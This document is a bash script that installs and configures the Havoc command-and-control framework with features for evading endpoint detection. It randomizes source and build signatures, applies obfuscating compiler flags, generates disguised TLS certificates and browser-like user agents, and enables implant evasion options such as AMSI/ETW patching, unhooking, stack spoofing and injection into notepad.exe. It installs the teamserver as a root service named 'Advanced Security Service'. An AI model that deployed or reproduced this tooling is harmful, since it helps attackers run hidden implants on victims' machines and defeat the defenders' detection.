#!/bin/bash
# Enhanced Havoc C2 Framework installer with advanced EDR evasion features
# This script automatically randomizes the entire Havoc installation

set -e
TEMP_DIR=$(mktemp -d)
LOG_FILE="/root/Tools/havoc_installer.log"
HAVOC_DIR="/root/Tools/havoc"
HAVOC_DATA_DIR="/root/Tools/havoc/data"
HAVOC_VERSION="0.5.0"
HAVOC_GITHUB="https://github.com/HavocFramework/Havoc"

# Function to log messages
log() {
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] $1" | tee -a $LOG_FILE
}

# Function to generate random strings
random_string() {
    local length=${1:-16}
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $length | head -n 1
}

# Function to generate random domain-like string
random_domain() {
    local tlds=("com" "net" "org" "io" "co" "biz" "info" "dev")
    local prefix=$(random_string 6)
    local tld=${tlds[$RANDOM % ${#tlds[@]}]}
    echo "${prefix}.${tld}"
}

# Generate random binary signature values
RANDOMIZED_BUILD_ID=$(random_string 16)
RANDOMIZED_COMPILER_FLAGS="-Os -mllvm -sub -mllvm -fla -mllvm -bcf"
RANDOMIZED_VERSION="${HAVOC_VERSION}-${RANDOMIZED_BUILD_ID:0:8}"
RANDOMIZED_UA1="Mozilla/5.0 (Windows NT $(( $RANDOM % 4 + 8 )).$(( $RANDOM % 2 + 1 )); Win64; x64) AppleWebKit/$(( $RANDOM % 200 + 500 )).$(( $RANDOM % 50 + 1 ))"
RANDOMIZED_UA2="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_$(( $RANDOM % 5 + 10 ))_$(( $RANDOM % 5 + 1 ))) AppleWebKit/$(( $RANDOM % 200 + 500 )).$(( $RANDOM % 50 + 1 ))"

# Generate random port numbers
TEAMSERVER_PORT=$(( $RANDOM % 20000 + 40000 ))
HTTP_PORT=$(( $RANDOM % 20000 + 10000 ))
HTTPS_PORT=$(( $RANDOM % 10 + 440 ))

# Generate random URI paths (realistic looking)
URI_PATHS=()
URI_COUNT=$(( $RANDOM % 4 + 3 ))
URI_OPTIONS=("/api/v1" "/api/v2" "/dashboard" "/content" "/static" "/assets" "/app" 
             "/data" "/stream" "/ws" "/socket" "/feed" "/updates" "/sync" "/auth")

for i in $(seq 1 $URI_COUNT); do
    RAND_INDEX=$(( $RANDOM % ${#URI_OPTIONS[@]} ))
    URI_PATHS+=("${URI_OPTIONS[$RAND_INDEX]}")
    unset 'URI_OPTIONS[$RAND_INDEX]'
    URI_OPTIONS=("${URI_OPTIONS[@]}")
done

# Generate random C2 evasion settings
SLEEP_TIME=$(( $RANDOM % 10 + 2 ))
JITTER_PCT=$(( $RANDOM % 40 + 20 ))
SYSCALL_METHOD=$(( $RANDOM % 3 ))
SLEEP_MASK_TECHNIQUE=$(( $RANDOM % 4 ))
SLEEP_MASK_ENABLED=$(( $RANDOM % 2 ))

# Install required dependencies
log "Installing dependencies..."
apt-get update >/dev/null 2>&1
apt-get install -y git golang-go make build-essential mingw-w64 nasm cmake \
    ninja-build python3-pip libfontconfig1 libglu1-mesa-dev libgtest-dev \
    libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev \
    libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev \
    qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 \
    libqt5websockets5-dev binutils-dev >/dev/null 2>&1

# Setup Go environment
log "Setting up Go environment..."
mkdir -p /root/go
export GOPATH=/root/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin

# Clone Havoc repository
log "Cloning Havoc repository..."
if [ -d "$HAVOC_DIR" ]; then
    log "Havoc directory already exists, updating..."
    cd $HAVOC_DIR
    git pull
else
    git clone --quiet $HAVOC_GITHUB $HAVOC_DIR
    cd $HAVOC_DIR
fi

# Modify Havoc source for signature randomization
log "Modifying Havoc source with unique signature: $RANDOMIZED_BUILD_ID"
cd $HAVOC_DIR/Teamserver

# Randomize version string
sed -i "s/const Version = \".*\"/const Version = \"${RANDOMIZED_VERSION}\"/" pkg/common/metadata.go

# Add custom code markers to make binaries unique
for gofile in $(find . -name "*.go"); do
    # Add random comments at the end of random lines to alter binary signature
    if [[ $(($RANDOM % 10)) -lt 3 ]]; then
        sed -i "$((RANDOM % 50 + 10))s/$/ \/\/ $(random_string 20)/" "$gofile"
    fi
done

# Build Havoc teamserver with custom compiler flags
log "Building customized Havoc teamserver..."
export EXTRA_GOFLAGS="-ldflags=-buildid=$(random_string 16)"
go build -trimpath -ldflags="-w -s -buildid=$(random_string 16)" -o teamserver main.go

# Build Havoc client
log "Building Havoc client..."
cd $HAVOC_DIR/Client
mkdir -p build
cd build
cmake -GNinja ..
ninja

# Generate unique TLS certificates
mkdir -p $HAVOC_DATA_DIR/certs
cd $HAVOC_DATA_DIR/certs

if [ ! -f havoc.key ] || [ ! -f havoc.crt ]; then
    log "Generating unique TLS certificates..."
    
    # Generate random values for certificate
    COUNTRY_CODES=("US" "GB" "CA" "AU" "DE" "FR" "JP" "SG")
    COUNTRY=${COUNTRY_CODES[$RANDOM % ${#COUNTRY_CODES[@]}]}
    STATE=$(random_string 8)
    LOCALITY=$(random_string 8)
    ORGANIZATION=$(random_string 10)
    COMMON_NAME=$(random_domain)
    
    # Create OpenSSL config
    cat > openssl.cnf << EOF
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
default_bits = 4096

[req_distinguished_name]
C = $COUNTRY
ST = $STATE
L = $LOCALITY
O = $ORGANIZATION
CN = $COMMON_NAME

[v3_req]
keyUsage = critical, digitalSignature, keyAgreement, keyEncipherment
extendedKeyUsage = serverAuth, clientAuth
subjectAltName = @alt_names
basicConstraints = critical, CA:false
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always
nsCertType = server

[alt_names]
DNS.1 = $COMMON_NAME
DNS.2 = $(random_domain)
DNS.3 = localhost
IP.1 = 127.0.0.1
EOF
    
    # Generate certificate with 4096-bit key
    openssl req -x509 -newkey rsa:4096 -keyout havoc.key -out havoc.crt -days 3650 -nodes -config openssl.cnf -sha384
    chmod 600 havoc.key
    chmod 644 havoc.crt
    
    log "Generated unique TLS certificates with CN=$COMMON_NAME"
fi

# Create profiles directory
mkdir -p $HAVOC_DATA_DIR/profiles

# Generate randomized admin credentials
ADMIN_USER=$(random_string 6)
ADMIN_PASS=$(random_string 24)

# Create unique Havoc profile with randomized settings
log "Creating unique Havoc profile..."
cat > $HAVOC_DATA_DIR/profiles/default.yaotl << EOF
Teamserver {
    Host = "0.0.0.0"
    Port = $TEAMSERVER_PORT
    
    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
        CompilerFlags = "$RANDOMIZED_COMPILER_FLAGS"
    }
}

Operators {
    $ADMIN_USER {
        Password = "$ADMIN_PASS"
    }
}

Listeners {
    http {
        Name         = "http"
        KillDate     = "2030-01-01"
        WorkingHours = "0:00-23:59"
        Hosts        = ["0.0.0.0"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        Port         = $HTTP_PORT
        PortBind     = $HTTP_PORT
        UserAgent    = "$RANDOMIZED_UA1"
        Headers      = ["Accept: */*", "Accept-Language: en-US,en;q=0.9"]
        Uris         = [
            $(printf '"%s",' "${URI_PATHS[@]}" | sed 's/,$//')
        ]
        Secure       = false
    }
    
    https {
        Name         = "https"
        KillDate     = "2030-01-01"
        WorkingHours = "0:00-23:59"
        Hosts        = ["0.0.0.0"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        Port         = $HTTPS_PORT
        PortBind     = $HTTPS_PORT
        UserAgent    = "$RANDOMIZED_UA2"
        Headers      = ["Accept: */*", "Accept-Language: en-US,en;q=0.9"]
        Uris         = [
            $(printf '"%s",' "${URI_PATHS[@]}" | sed 's/,$//')
        ]
        Secure       = true
        Cert         = "$HAVOC_DATA_DIR/certs/havoc.crt"
        Key          = "$HAVOC_DATA_DIR/certs/havoc.key"
    }
}

Demon {
    Sleep            = $SLEEP_TIME
    SleepJitter      = $JITTER_PCT
    IndirectSyscalls = true
    
    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }

    Evasion {
        StackSpoofing = true
        SleazeUnhook = true
        AmsiEtwPatching = true
        SyscallMethod = $SYSCALL_METHOD
        $(if [ "$SLEEP_MASK_ENABLED" -eq 1 ]; then echo "EnableSleepMask = true
        SleepMaskTechnique = $SLEEP_MASK_TECHNIQUE"; fi)
    }
}
EOF

# Save the randomization details for other scripts to use
mkdir -p $HAVOC_DIR/config
cat > $HAVOC_DIR/config/profile.json << EOF
{
  "build_id": "$RANDOMIZED_BUILD_ID",
  "version": "$RANDOMIZED_VERSION",
  "teamserver_port": $TEAMSERVER_PORT,
  "http_port": $HTTP_PORT,
  "https_port": $HTTPS_PORT,
  "admin_user": "$ADMIN_USER",
  "admin_pass": "$ADMIN_PASS",
  "sleep_time": $SLEEP_TIME,
  "jitter_percent": $JITTER_PCT,
  "syscall_method": $SYSCALL_METHOD,
  "sleep_mask_enabled": $SLEEP_MASK_ENABLED,
  "sleep_mask_technique": $SLEEP_MASK_TECHNIQUE,
  "uri_paths": [$(printf '"%s",' "${URI_PATHS[@]}" | sed 's/,$//')],
  "user_agent_http": "$RANDOMIZED_UA1",
  "user_agent_https": "$RANDOMIZED_UA2",
  "created_at": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF

# Create systemd service for Havoc
log "Creating systemd service for Havoc Teamserver..."
cat > /etc/systemd/system/havoc.service << EOF
[Unit]
Description=Advanced Security Service
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=$HAVOC_DIR/Teamserver
ExecStart=$HAVOC_DIR/Teamserver/teamserver server --profile $HAVOC_DATA_DIR/profiles/default.yaotl
Restart=always
RestartSec=10

# Security measures
PrivateTmp=true
ProtectHome=false
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

# Set proper permissions
log "Setting proper permissions..."
chmod 755 $HAVOC_DIR/Teamserver/teamserver
chmod 755 $HAVOC_DIR/Client/havoc
chmod 600 $HAVOC_DIR/config/profile.json

# Create symlinks to executables in /usr/local/bin
ln -sf $HAVOC_DIR/Teamserver/teamserver /usr/local/bin/havoc-teamserver
ln -sf $HAVOC_DIR/Client/havoc /usr/local/bin/havoc-client

# Enable and start Havoc service
log "Enabling and starting Havoc service..."
systemctl daemon-reload
systemctl enable havoc
systemctl start havoc

log "Havoc C2 installation completed with unique signatures!"
log "===== IMPORTANT CREDENTIALS ====="
log "Admin User: $ADMIN_USER"
log "Admin Password: $ADMIN_PASS"
log "Teamserver Port: $TEAMSERVER_PORT"
log "HTTP Listener Port: $HTTP_PORT"
log "HTTPS Listener Port: $HTTPS_PORT"
log "All settings saved to: $HAVOC_DIR/config/profile.json"